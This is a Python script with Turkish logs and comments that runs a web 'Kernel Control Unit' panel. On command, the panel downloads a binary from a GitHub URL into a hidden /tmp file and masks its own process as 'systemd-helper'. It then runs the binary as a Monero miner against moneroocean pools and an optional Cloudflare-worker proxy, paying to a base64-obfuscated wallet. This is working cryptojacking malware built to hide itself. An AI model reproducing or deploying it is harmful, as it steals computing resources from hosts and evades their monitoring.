#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
import json
import tempfile
import re
import signal
from urllib.parse import urlparse
from collections import deque

libc = ctypes.CDLL('libc.so.6')
CONSOLE_LOGS = deque(maxlen=50)
STATUS = {"running": False, "message": "Sistem Beklemede"}
CF_WORKER_HOST = ""
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()

# Havuz listesi (öncelik sırasına göre)
POOLS = [
    "gulf.moneroocean.stream:443"
]

def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def log_to_console(msg):
    clean_msg = clean_ansi(msg)
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {clean_msg}"
    CONSOLE_LOGS.append(line)
    print(msg)  # Orijinal renkli çıktı terminale

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def kill_process(proc):
    """Süreci ve tüm alt süreçlerini sonlandır."""
    try:
        proc.terminate()
        time.sleep(1)
        proc.kill()
    except:
        pass

def execution_logic():
    global STATUS
    try:
        log_to_console("Aktivasyon sinyali alındı.")
        log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
        
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()
        
        log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
        log_to_console("Geçici dosya oluşturuluyor...")
        
        with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
            tmp_file.write(binary_content)
            tmp_path = tmp_file.name
        
        os.chmod(tmp_path, 0o755)
        log_to_console(f"Dosya oluşturuldu: {tmp_path}")
        
        log_to_console("Süreç maskeleniyor: systemd-helper")
        set_process_name("systemd-helper")
        
        # Havuz listesini oluştur: önce CF_WORKER_HOST varsa onu ekle, sonra fallback'leri
        pools_to_try = []
        if CF_WORKER_HOST:
            pools_to_try.append(f"{CF_WORKER_HOST}:443")
        pools_to_try.extend(POOLS)
        
        STATUS["running"] = True
        STATUS["message"] = "Sistem Aktif"
        
        # Her havuzu dene
        for pool_index, pool_host in enumerate(pools_to_try):
            log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
            
            use_tls = ":443" in pool_host
            cmd = [
                tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                "-p", f"node-{int(time.time())%1000}", "--keepalive",
                "--donate-level=1", "--cpu-max-threads-hint", "50"
            ]
            if use_tls:
                cmd.append("--tls")
            
            log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
            
            # Hata sayacı
            error_count = 0
            max_errors = 5
            success = False
            
            # Çıktıları oku
            for line in iter(proc.stdout.readline, ""):
                if not line:
                    break
                log_to_console(f"{line.strip()}")
                
                # "read error" kontrolü
                if "read error" in line.lower():
                    error_count += 1
                    log_to_console(f"Hata sayacı: {error_count}/{max_errors}")
                    if error_count >= max_errors:
                        log_to_console(f"Çok fazla hata, havuz değiştiriliyor...")
                        kill_process(proc)
                        break
                
                # Eğer "accepted" (kabul edilen share) görürsek, başarılı sayalım ve bu havuzda kalalım
                if "accepted" in line.lower():
                    success = True
                    # Hata sayacını sıfırla (isteğe bağlı)
                    error_count = 0
            
            # Eğer döngüden çıkıldıysa (proc bitti veya kırıldı)
            if proc.poll() is None:
                kill_process(proc)
            
            # Eğer başarılı olduysak, döngüden çık (zaten sonsuz döngüde olacak, ama buraya gelmez)
            if success:
                log_to_console(f"Havuz {pool_host} başarılı, kalıcı olarak kullanılıyor.")
                break
            
            # Son havuzsa ve başarısızsa, uyarı ver
            if pool_index == len(pools_to_try) - 1:
                log_to_console("Tüm havuzlar denendi, bağlantı kurulamadı. Madenci duracak.")
        
        # Geçici dosyayı temizle
        try:
            os.unlink(tmp_path)
        except:
            pass
        
    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = "Kritik Hata"
        log_to_console(f"HATA: {str(e)}")

class ControlHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(list(CONSOLE_LOGS)).encode())
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        btn_state = 'disabled style="opacity:0.5"' if STATUS["running"] else ""
        
        html = f"""
        <html><head><title>Kernel Console</title><style>
            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
            .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
            #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
            .btn {{ background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; }}
            .btn:hover:not(:disabled) {{ background: #0f0; color: #000; }}
            .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
        </style></head><body>
            <div class="panel">
                <h2>KERNEL CONTROL UNIT</h2>
                <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
                <form action="/run" method="post"><button class="btn" {btn_state}>SİSTEMİ BAŞLAT</button></form>
                <div id="console">Konsol bekleniyor...</div>
            </div>
            <script>
                async function updateLogs() {{
                    try {{
                        const r = await fetch('/api/logs');
                        const logs = await r.json();
                        const c = document.getElementById('console');
                        c.innerHTML = logs.join('<br>');
                        c.scrollTop = c.scrollHeight;
                    }} catch(e) {{}}
                }}
                setInterval(updateLogs, 2000);
                updateLogs();
            </script>
        </body></html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == "/run" and not STATUS["running"]:
            threading.Thread(target=execution_logic, daemon=True).start()
        self.send_response(303)
        self.send_header("Location", "/")
        self.end_headers()

def run():
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    print(f"CF_WORKER_HOST ayarlandı: {CF_WORKER_HOST}")  # Docker logunda görmek için
    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()

if __name__ == "__main__":
    run()
